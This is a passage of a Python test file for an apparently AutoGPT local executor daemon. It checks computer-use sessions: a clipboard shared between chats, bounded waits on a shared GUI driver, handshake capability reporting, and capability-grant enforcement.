    parent = make_handler(enable_clipboard=True, session_id=None)
    child = make_handler(enable_clipboard=True, session_id="child")
    parent.share_with(child)

    await parent.handle(_call("clipboard_write", {"text": "from the first chat"}))
    response = await child.handle(_call("clipboard_read"))
    listing = await child.handle(ComputerToolsRequestMessage(id=new_id(), ts=now_ts()))

    assert isinstance(response, ComputerToolResultMessage)
    assert (response.payload.structured_content or {})["text"] == "from the first chat"
    assert isinstance(listing, ComputerToolsResponseMessage)
    assert "in this chat or another" in listing.payload.instructions
    assert "this session" not in listing.payload.instructions


# ── Daemon ───────────────────────────────────────────────────────────────


async def test_a_child_session_waits_only_briefly_for_a_busy_shared_driver(
    tmp_path, fake_log, monkeypatch
) -> None:
    """The platform waits a few seconds (eight) for a chat's session to
    connect, then undoes the chat. A new chat's permission check waited up
    to 30 s for the shared driver, which another chat's call can hold far
    longer, and its HELLO up to 10 s more for the screen size."""
    from autogpt_local_executor import handlers, platform_info

    monkeypatch.setattr(platform_info, "detect_platform", lambda: "darwin")
    monkeypatch.setattr(handlers, "CHILD_DRIVER_WAIT_SECONDS", 0.2, raising=False)
    parent = _daemon(tmp_path, session_id=None)
    child = _daemon(tmp_path, session_id="child-1")
    parent._computer_handler.share_with(child._computer_handler)
    driver = parent._computer_handler.driver
    await driver.snapshot()
    await driver._turn.acquire()  # another chat's call, running
    starting = asyncio.ensure_future(
        asyncio.gather(child._preflight_computer_use(), child._computer_handler.screen_size())
    )
    try:
        done, _ = await asyncio.wait({starting}, timeout=5)
        assert starting in done
        assert starting.result() == [None, None]
    finally:
        starting.cancel()
        driver._turn.release()
        await parent._computer_handler.close()


async def test_a_child_hello_waits_only_briefly_for_a_driver_starting_again(
    tmp_path, fake_log, linux_with_display, monkeypatch
) -> None:
    """A new chat's HELLO waited, without a deadline, for the shared driver
    to start again after another chat's call overran it, which can take a
    minute; the platform undoes a chat whose session isn't up in about
    eight seconds. It now goes on with the tools the driver last offered."""
    from autogpt_local_executor import handlers

    monkeypatch.setattr(handlers, "CHILD_DRIVER_WAIT_SECONDS", 0.2, raising=False)
    parent = _daemon(tmp_path, session_id=None)
    child = _daemon(tmp_path, session_id="child-1")
    parent._computer_handler.share_with(child._computer_handler)
    driver = parent._computer_handler.driver
    await driver.snapshot()
    await driver._stop_client()  # stopped to end another chat's call
    await driver._lock.acquire()  # and starting again, slowly
    building = asyncio.ensure_future(child._build_hello())
    try:
        done, _ = await asyncio.wait({building}, timeout=10)
        assert building in done
        hello = building.result()
    finally:
        building.cancel()
        driver._lock.release()
        await parent._computer_handler.close()

    assert "computer_use" in hello.payload.capabilities
    assert hello.payload.computer_use_tools == sorted(catalog.offered_tools(enable_clipboard=False))


def _daemon(tmp_path: Path, **overrides: Any):
    from autogpt_local_executor.daemon import ShimDaemon

    config = _config(tmp_path, cua_driver_path=str(FAKE), **overrides)
    audit = AuditWriter(config.audit_log_path, b"a" * 32)
    daemon = ShimDaemon(config, token_store=object(), audit=audit)
    daemon._computer_handler._driver = fake_bridge()
    return daemon


@pytest.fixture
def linux_with_display(monkeypatch: pytest.MonkeyPatch) -> None:
    from autogpt_local_executor import platform_info

    monkeypatch.setattr(platform_info, "detect_platform", lambda: "linux")
    monkeypatch.setenv("DISPLAY", ":0")


async def test_hello_names_the_driver_once_it_has_started(
    tmp_path, fake_log, linux_with_display
) -> None:
    daemon = _daemon(tmp_path)
    try:
        hello = await daemon._build_hello()
    finally:
        await daemon._computer_handler.close()

    assert "computer_use" in hello.payload.capabilities
    driver_info = hello.payload.computer_use_driver
    assert (driver_info.name, driver_info.version, driver_info.runtime) == (
        "cua-driver",
        "0.38.0",
        "direct",
    )
    assert hello.payload.screen_resolution == (1920, 1080)
    assert hello.payload.computer_use_tools == sorted(catalog.offered_tools(enable_clipboard=False))


async def test_hello_goes_out_when_the_driver_refuses_the_screen_size(
    tmp_path, fake_log, linux_with_display, monkeypatch
) -> None:
    """A JSON-RPC error from get_screen_size escaped HELLO, so the handshake
    failed and the shim reconnected forever. The size is optional there."""
    monkeypatch.setenv("FAKE_CUA_RPC_ERROR", "get_screen_size")
    daemon = _daemon(tmp_path)
    try:
        hello = await daemon._build_hello()
    finally:
        await daemon._computer_handler.close()

    assert "computer_use" in hello.payload.capabilities
    assert hello.payload.screen_resolution is None


async def test_hello_leaves_out_computer_use_a_driver_cannot_serve(
    tmp_path, fake_log, linux_with_display, monkeypatch
) -> None:
    monkeypatch.setenv("FAKE_CUA_VERSION", "0.12.0")
    daemon = _daemon(tmp_path)
    try:
        hello = await daemon._build_hello()
    finally:
        await daemon._computer_handler.close()

    assert "computer_use" not in hello.payload.capabilities
    assert hello.payload.computer_use_driver is None
    assert hello.payload.computer_use_tools == []
    assert hello.payload.screen_resolution is None


async def test_hello_without_computer_use_starts_no_driver(
    tmp_path, fake_log, linux_with_display
) -> None:
    daemon = _daemon(tmp_path, enable_computer_use=False)

    hello = await daemon._build_hello()

    assert hello.payload.computer_use_driver is None
    assert _records(fake_log, "initialize") == []


async def test_computer_tool_calls_need_the_granted_capability(tmp_path, fake_log) -> None:
    daemon = _daemon(tmp_path)
    daemon._granted_capabilities = frozenset({"files"})

    response = await daemon._handle(_call("click", {"pid": 1}))

    assert isinstance(response, ErrorMessage)
    assert response.payload.code == ErrorCode.CAPABILITY_NOT_GRANTED
    assert _records(fake_log, "call") == []


async def test_a_call_queued_behind_another_chats_call_gives_up_unstarted(
    tmp_path, fake_log
) -> None:
    """The daemon waited for the computer with no bound, so a call queued
    behind another chat's started whenever its turn came."""
    daemon = _daemon(tmp_path)
    daemon._granted_capabilities = frozenset({"files", "computer_use"})
    daemon._semaphore = asyncio.Semaphore(4)
    sent: list[Any] = []

    async def send_frame(_ws: Any, frame: Any) -> bool:
        sent.append(frame)
        return True

    daemon._send_frame = send_frame  # type: ignore[method-assign]
    try:
        # Another chat's call holds the computer for longer than this one may wait.
        async with daemon._computer_use_lock:
            await asyncio.wait_for(
                daemon._dispatch(None, _call("click", {"pid": 1}, timeout_seconds=1)), 30
            )
    finally:
        await daemon._computer_handler.close()

    [frame] = sent
    assert isinstance(frame, ErrorMessage)
    assert frame.payload.code == ErrorCode.COMMAND_TIMEOUT
    assert frame.payload.details["started"] is False
    assert _records(fake_log, "call") == []


async def test_a_child_session_starts_while_another_chats_call_holds_the_driver(
    tmp_path, fake_log, monkeypatch
) -> None:
    """On macOS every session checked the grants through the shared driver,
    within 30 s. A call from another chat that held the driver longer failed
    the new session's preflight, so it ended after activation had reported it
    ready."""
    from autogpt_local_executor import daemon as daemon_module
    from autogpt_local_executor import platform_info

    monkeypatch.setattr(platform_info, "detect_platform", lambda: "darwin")
    monkeypatch.setattr(daemon_module, "PERMISSION_CHECK_SECONDS", 0.3)
    monkeypatch.setenv("FAKE_CUA_SLOW_SECONDS", "1.5")
    parent = _daemon(tmp_path, session_id=None)
    child = _daemon(tmp_path, session_id="child-1")
    parent._computer_handler.share_with(child._computer_handler)
    driver = parent._computer_handler.driver
    try:
        slow = asyncio.create_task(driver.call_tool("drag", {"pid": -2}, timeout=30))
        for _ in range(250):
            if _records(fake_log, "call"):
                break
            await asyncio.sleep(0.02)

        await child._preflight_computer_use()  # doesn't raise
        result = await slow
        # The parent, which owns the driver, still fails a check that can't run.
        busy = asyncio.create_task(driver.call_tool("drag", {"pid": -2}, timeout=30))
        for _ in range(250):
            if len(_records(fake_log, "call")) >= 2:
                break
            await asyncio.sleep(0.02)
        with pytest.raises(daemon_module.DaemonPreflightError):
            await parent._preflight_computer_use()
        await busy
    finally:
        await parent._computer_handler.close()

    assert result["content"] == [{"type": "text", "text": "slow"}]
    assert [r["tool"] for r in _records(fake_log, "call")] == ["drag", "drag"]


async def test_the_tool_list_does_not_wait_for_a_running_action(tmp_path, fake_log) -> None:
    """Calls take turns on the one GUI; listing tools touches no window."""
    daemon = _daemon(tmp_path)
    daemon._granted_capabilities = frozenset({"files", "computer_use"})
    try:
        async with daemon._computer_use_lock:
            listed = await asyncio.wait_for(
                daemon._handle(ComputerToolsRequestMessage(id=new_id(), ts=now_ts())), 30
            )
    finally:
        await daemon._computer_handler.close()

    assert isinstance(listed, ComputerToolsResponseMessage)


async def test_a_child_session_uses_the_parents_driver(tmp_path, fake_log, monkeypatch) -> None:
    from autogpt_local_executor.daemon import ShimDaemon
    from autogpt_local_executor.session_grants import RootBinding

    parent = _daemon(tmp_path, session_id=None)
    started: list[ShimDaemon] = []

    async def run(self) -> None:
        started.append(self)
        await asyncio.sleep(3600)

    monkeypatch.setattr(ShimDaemon, "run", run)
    binding = RootBinding(
        session_id="child-1",
        allowed_root=tmp_path,
        fingerprint="0" * 64,
        revision=1,
        root_grant="grant",
    )
    try:
        await parent._start_child_session(binding)
        await asyncio.sleep(0)
        [child] = started
        assert child._computer_handler.driver is parent._computer_handler.driver
        assert child._computer_handler._screenshot_rate is parent._computer_handler._screenshot_rate
        assert child._computer_handler.clipboard_writeback is (
            parent._computer_handler.clipboard_writeback
        )
        assert child._computer_handler.session_label != parent._computer_handler.session_label
    finally:
        await parent._shutdown_children()
        await parent._computer_handler.close()
